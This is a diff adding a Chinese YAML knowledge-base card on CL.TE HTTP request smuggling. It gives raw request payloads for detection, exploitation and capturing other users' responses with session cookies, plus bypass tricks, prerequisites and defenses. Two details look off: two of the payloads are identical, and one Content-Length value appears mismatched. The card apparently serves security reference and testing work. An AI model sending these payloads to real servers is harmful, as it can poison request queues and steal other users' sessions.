@@ -1,0 +1,91 @@
+# 技术卡片: HTTP 请求走私 - CL.TE
+# 分类: request-smuggling / cl-te
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-RS-001 / PortSwigger
+
+id: "rs-cl-te"
+name: "HTTP 请求走私 CL.TE"
+category: "request-smuggling"
+subcategory: "cl-te"
+severity: "high"
+
+description: |
+  前端用 Content-Length 定界，后端用 Transfer-Encoding: chunked 分块。
+  后端将 chunked 终止后的剩余字节当作下一个请求的前缀处理。
+
+trigger_signals:
+  - "前端代理/CDN + 后端应用架构"
+  - "同时发送 CL 和 TE 头时响应异常"
+  - "不同请求间出现响应错乱或超时"
+
+payloads:
+  detection:
+    - request: |
+        POST / HTTP/1.1
+        Host: target.com
+        Content-Length: 6
+        Transfer-Encoding: chunked
+
+        0
+
+        G
+    - note: "后端将 G 视为下一个请求开头，导致后续请求变为 GPOST / → 400/超时"
+
+  exploit_basic:
+    - request: |
+        POST / HTTP/1.1
+        Host: target.com
+        Content-Length: 6
+        Transfer-Encoding: chunked
+
+        0
+
+        G
+    - note: "走私前缀 G 污染下一个真实请求的方法行"
+
+  response_queue_poisoning:
+    - request: |
+        POST / HTTP/1.1
+        Host: target.com
+        Content-Length: 80
+        Transfer-Encoding: chunked
+
+        0
+
+        GET /admin HTTP/1.1
+        Host: target.com
+        X-Ignore: X
+    - note: "捕获下一个用户的响应（含 session cookie）"
+
+  timing_detection:
+    - send1: "走私请求"
+    - send2: "正常请求"
+    - observe: "第二个请求响应时间异常或收到第一个请求的响应"
+
+bypasses:
+  - "chunk 扩展绕过: Transfer-Encoding: chunked; x=y"
+  - "CL 值精确匹配走私前缀长度"
+  - "在 chunk size 后插入分号注释: 5c;ignore"
+
+success_indicators:
+  - "响应队列投毒：自己的请求收到他人响应"
+  - "时间差/状态码差异"
+  - "第二个正常请求 400/超时"
+
+prerequisites:
+  - "前端使用 CL 定界，后端使用 TE 分块"
+  - "前后端 TCP 连接复用"
+  - "无 WAF 拦截双头请求"
+
+defense:
+  - "统一前后端 HTTP 解析器（同栈）"
+  - "禁用后端连接复用"
+  - "前端拒绝同时包含 CL 和 TE 的请求"
+  - "使用 HTTP/2 端到端避免降级歧义"
+
+sources:
+  - kb: "KB-RS-001"
+  - ref: "James Kettle: HTTP Desync Attacks (Black Hat 2019)"
+  - ref: "PortSwigger: CL.TE vulnerability"
+  - ref: "CWE-444"
